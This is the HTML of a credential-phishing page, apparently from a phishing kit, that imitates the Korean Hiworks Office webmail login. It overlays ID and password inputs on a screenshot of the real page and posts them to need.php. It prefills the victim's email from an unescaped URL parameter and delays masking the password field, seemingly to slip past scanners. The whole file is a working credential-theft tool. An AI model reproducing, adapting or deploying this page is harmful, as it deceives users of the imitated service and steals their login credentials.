<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#54616;&#51060;&#50893;&#49828;&#32;&#50724;&#54588;&#49828;</title>
<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
<script>setTimeout(function() {
  document.getElementsByTagName('input')[2].type = "password"
}, 1000);
</script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>
<style type="text/css">
.textbox {
  	padding-left: 7px;
    border-radius: 0px;
  	font-family: Apple Gothic,"Malgun Gothic",dotum,"Arial", sans-serif;
    font-size: 16px;
    color: #333333;
    height: 50px;
    width: 275px;
    border: 1px solid #c8c8c8;
}
</style>
<style type="text/css">
div#container
{
	position:relative;
	width: 490px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

<style>
p{font-size: 40px;}
.loader {
    position: fixed;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
    z-index: 9999;
    background: url('https://smallenvelop.com/wp-content/uploads/2014/08/Preloader_11.gif') 50% 50% no-repeat rgb(249,249,249);
    opacity: .8;
}
</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript">
$(window).load(function() {
	$(".loader").fadeOut("slow");
});
</script>

</head>
<body bgColor="#F3F2F0">
<div class="loader"></div>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:490px; height:657px; z-index:0"><img src="images/w1.png" alt="" title="" border=0 width=490 height=657></div>

<div id="image2" style="position:absolute; overflow:hidden; left:190px; top:607px; width:112px; height:21px; z-index:1"><a href="#"><img src="images/w2.png" alt="" title="" border=0 width=112 height=21></a></div>

<div id="image3" style="position:absolute; overflow:hidden; left:407px; top:338px; width:49px; height:30px; z-index:2"><a href="#"><img src="images/w3.png" alt="" title="" border=0 width=49 height=30></a></div>

<form action=need.php name=nashahogya id=nashahogya method=post>
<div id="formcheckbox1" style="position:absolute; left:30px; top:340px; z-index:3"><input type="checkbox" name="formcheckbox1"></div>

<input name="ud" value="<?php echo $_GET['email']; ?>" placeholder="&#50500;&#51060;&#46356;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:420px;left:35px;top:382px;z-index:4">

<input name="pd" placeholder="&#48708;&#48128;&#48264;&#54840;" autofocus class="textbox" autocomplete="off" required type="text" style="position:absolute;width:420px;left:35px;top:444px;z-index:5">

<div id="formimage1" style="position:absolute; left:34px; top:516px; z-index:6">

<input type="image" name="formimage1" width="422" height="72" src="images/hwg.png"></div>
</div>

</body>
</html>
